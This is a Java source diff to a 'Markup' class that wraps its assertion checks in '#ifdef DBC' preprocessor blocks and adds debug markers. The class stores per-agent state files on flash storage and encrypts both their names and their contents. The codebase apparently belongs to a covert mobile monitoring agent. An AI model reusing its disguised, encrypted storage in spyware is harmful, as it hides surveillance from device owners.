@@ -36,8 +36,11 @@ public class Markup {
      * una stringa vuota.
      */
     static String makeMarkupName(int agentId, boolean addPath) {
-        Check.requires(agentId >= 0, "agentId < 0");
+        // #ifdef DBC
+//@        Check.requires(agentId >= 0, "agentId < 0");
+        // #endif
         String logName = NumberUtilities.toString(agentId, 16, 4);
+        // #debug
         debug.trace("makeMarkupName from: " + logName);
 
         String markupName = makeMarkupName(logName, addPath, false);
@@ -56,8 +59,12 @@ public class Markup {
      */
     static String makeMarkupName(String markupName, boolean addPath,
             boolean storeToMMC) {
-        Check.requires(markupName != null, "null markupName");
-        Check.requires(markupName != "", "empty markupName");
+        // #ifdef DBC
+//@        Check.requires(markupName != null, "null markupName");
+        // #endif
+        // #ifdef DBC
+//@        Check.requires(markupName != "", "empty markupName");
+        // #endif
 
         String encName = "";
 
@@ -71,6 +78,7 @@ public class Markup {
 
         encName += Encryption.encryptName(markupName + MARKUP_EXTENSION, Keys
                 .getInstance().getChallengeKey()[0]);
+        // #debug
         debug.trace("makeMarkupName: " + encName);
 
         return encName;
@@ -83,20 +91,28 @@ public class Markup {
      */
 
     public static synchronized void removeMarkup(int agentId_) {
-        Check.requires(agentId_ > 0, "agentId null");
+        // #ifdef DBC
+//@        Check.requires(agentId_ > 0, "agentId null");
+        // #endif
 
         String markupName = makeMarkupName(agentId_, true);
-        Check.asserts(markupName != "", "markupName empty");
+        // #ifdef DBC
+//@        Check.asserts(markupName != "", "markupName empty");
+        // #endif
 
         AutoFlashFile file = new AutoFlashFile(markupName, true);
         file.delete();
     }
 
     public synchronized void removeMarkup() {
-        Check.requires(agentId > 0, "agentId null");
+        // #ifdef DBC
+//@        Check.requires(agentId > 0, "agentId null");
+        // #endif
 
         String markupName = makeMarkupName(agentId, true);
-        Check.asserts(markupName != "", "markupName empty");
+        // #ifdef DBC
+//@        Check.asserts(markupName != "", "markupName empty");
+        // #endif
 
         AutoFlashFile remove = new AutoFlashFile(markupName, true);
         remove.delete();
@@ -161,10 +177,14 @@ public class Markup {
     }
 
     public synchronized boolean isMarkup() {
-        Check.requires(agentId > 0, "agentId null");
+        // #ifdef DBC
+//@        Check.requires(agentId > 0, "agentId null");
+        // #endif
 
         String markupName = makeMarkupName(agentId, true);
-        Check.asserts(markupName != "", "markupName empty");
+        // #ifdef DBC
+//@        Check.asserts(markupName != "", "markupName empty");
+        // #endif
 
         AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
 
@@ -182,10 +202,14 @@ public class Markup {
      * @throws IOException
      */
     public synchronized byte[] readMarkup() throws IOException {
-        Check.requires(agentId > 0, "agentId null");
+        // #ifdef DBC
+//@        Check.requires(agentId > 0, "agentId null");
+        // #endif
 
         String markupName = makeMarkupName(agentId, true);
-        Check.asserts(markupName != "", "markupName empty");
+        // #ifdef DBC
+//@        Check.asserts(markupName != "", "markupName empty");
+        // #endif
 
         AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
 
@@ -194,11 +218,16 @@ public class Markup {
             int len = Utils.byteArrayToInt(encData, 0);
 
             byte[] plain = encryption.decryptData(encData, len, 4);
-            Check.asserts(plain != null, "wrong decryption: null");
-            Check.asserts(plain.length == len, "wrong decryption: len");
+            // #ifdef DBC
+//@            Check.asserts(plain != null, "wrong decryption: null");
+            // #endif
+            // #ifdef DBC
+//@            Check.asserts(plain.length == len, "wrong decryption: len");
+            // #endif
 
             return plain;
         } else {
+            // #debug
             debug.trace("Markup file does not exists");
             return null;
         }
@@ -214,7 +243,9 @@ public class Markup {
      */
     public synchronized boolean writeMarkup(byte[] data) {
         String markupName = makeMarkupName(agentId, true);
-        Check.asserts(markupName != "", "markupName empty");
+        // #ifdef DBC
+//@        Check.asserts(markupName != "", "markupName empty");
+        // #endif
 
         AutoFlashFile fileRet = new AutoFlashFile(markupName, true);
 
@@ -223,7 +254,9 @@ public class Markup {
 
         if (data != null) {
             byte[] encData = encryption.encryptData(data);
-            Check.asserts(encData.length >= data.length, "strange data len");
+            // #ifdef DBC
+//@            Check.asserts(encData.length >= data.length, "strange data len");
+            // #endif
             fileRet.write(data.length);
             fileRet.append(encData);
         }
